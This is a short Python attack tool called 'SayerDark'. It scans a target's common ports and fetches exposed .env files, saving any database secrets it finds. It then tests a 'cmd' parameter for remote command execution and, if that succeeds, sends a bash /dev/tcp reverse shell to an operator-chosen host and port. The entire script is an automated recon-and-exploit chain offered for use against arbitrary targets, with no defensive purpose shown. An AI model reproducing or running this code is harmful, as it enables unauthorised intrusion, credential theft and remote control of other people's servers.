import requests
import socket
import time
import os
import sys

# إعدادات الألوان للهيبة (Hacker Style)
G, R, Y, B, NC = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;34m', '\033[0m'

def banner():
    print(f"""{G}
   _____                      _____                __    
  / ___/ ____ _ __  __ ___   / __  \ ____ _ _____ / /__  
  \__ \ / __ `// / / // _ \ / / / // __ `// ___// //_/  
 ___/ // /_/ // /_/ //  __// /_/ // /_/ // /   / ,<     
/____/ \__,_/ \__, / \___//_____/ \__,_//_/   /_/|_|    
             /____/                                      
[+] Developer: SayerLinux | mailto:SayerLinux@gmail.com
[+] Module: Port Scan | Path Discovery | Auto-Exploit (Reverse Shell)
[!] The digital world is now under your command.{NC}""")

def port_scanner(target_ip):
    print(f"\n{B}[*] Scanning Ports on: {target_ip}...{NC}")
    common_ports = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL"}
    for port, service in common_ports.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        if s.connect_ex((target_ip, port)) == 0:
            print(f"{G}[+] Port {port} Open ({service}){NC}")
        s.close()

def env_extractor(url):
    print(f"\n{B}[*] Scanning for .env files on: {url}{NC}")
    paths = ["/.env", "/.env.local", "/config/.env"]
    for path in paths:
        try:
            res = requests.get(url.rstrip('/') + path, timeout=7, verify=False)
            if res.status_code == 200 and "DB_" in res.text:
                print(f"{R}[!!!] .env found at: {path}{NC}")
                with open("Extracted_Secrets.txt", "a") as f: f.write(res.text)
        except: pass

def advanced_exploit_engine(url):
    print(f"\n{B}[*] Starting Exploit Engine...{NC}")
    try:
        res = requests.get(url + "?cmd=id", timeout=10)
        if "uid=" in res.text:
            print(f"{R}[!!!] VULNERABLE TO RCE!{NC}")
            lhost = input(f"{G}[+] Enter LHOST: {NC}")
            lport = input(f"{G}[+] Enter LPORT: {NC}")
            requests.get(url + f"?cmd=bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    except: pass

def main():
    os.system('clear')
    banner()
    print(f"{G}1. 🌐 Full Recon & Auto-Exploit{NC}")
    target_url = input(f"\n{Y}[SayerDark] Enter Target URL: {NC}")
    target_domain = target_url.replace("http://", "").replace("https://", "").split('/')[0]
    
    try: port_scanner(socket.gethostbyname(target_domain))
    except: pass
    
    env_extractor(target_url)
    advanced_exploit_engine(target_url)

if __name__ == "__main__":
    main()
